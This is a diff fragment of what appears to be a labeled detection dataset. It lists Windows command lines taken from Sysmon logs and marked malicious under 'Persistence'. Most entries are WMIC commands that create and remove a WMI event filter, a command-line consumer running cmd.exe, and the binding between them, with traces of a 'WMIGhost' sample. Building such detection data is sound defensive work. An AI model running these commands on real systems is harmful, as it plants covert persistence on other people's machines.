+    "command": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" /namespace:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"BotConsumer23\", ExecutablePath=\"c:\\Windows\\System32\\cmd.exe\", CommandLineTemplate=\"c:\\Windows\\System32\\cmd.exe\"",
+    "label": 1,
+    "source": "sysmon_20_21_1_CommandLineEventConsumer.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" /namespace:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name=\"BotFilter82\"', Consumer='CommandLineEventConsumer.Name=\"BotConsumer23\"'",
+    "label": 1,
+    "source": "sysmon_20_21_1_CommandLineEventConsumer.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" /namespace:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"BotFilter82\", EventNameSpace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"",
+    "label": 1,
+    "source": "sysmon_20_21_1_CommandLineEventConsumer.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" /namespace:\"\\\\root\\subscription\" PATH CommandLineEventConsumer WHERE Name=\"BotConsumer23\" DELETE",
+    "label": 1,
+    "source": "sysmon_20_21_1_CommandLineEventConsumer.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" /namespace:\"\\\\root\\subscription\" PATH __EventFilter WHERE Name=\"BotFilter82\" DELETE",
+    "label": 1,
+    "source": "sysmon_20_21_1_CommandLineEventConsumer.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" /namespace:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name=\"BotFilter82\"' DELETE",
+    "label": 1,
+    "source": "sysmon_20_21_1_CommandLineEventConsumer.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "\"C:\\Users\\user01\\Desktop\\WMIGhost.exe\"",
+    "label": 1,
+    "source": "wmighost_sysmon_20_21_1.evtx",
+    "folder": "Persistence"
+  },
+  {
+    "command": "C:\\Windows\\system32\\wbem\\scrcons.exe -Embedding",
+    "label": 1,
+    "source": "wmighost_sysmon_20_21_1.evtx",
+    "folder": "Persistence"
+  }
+]
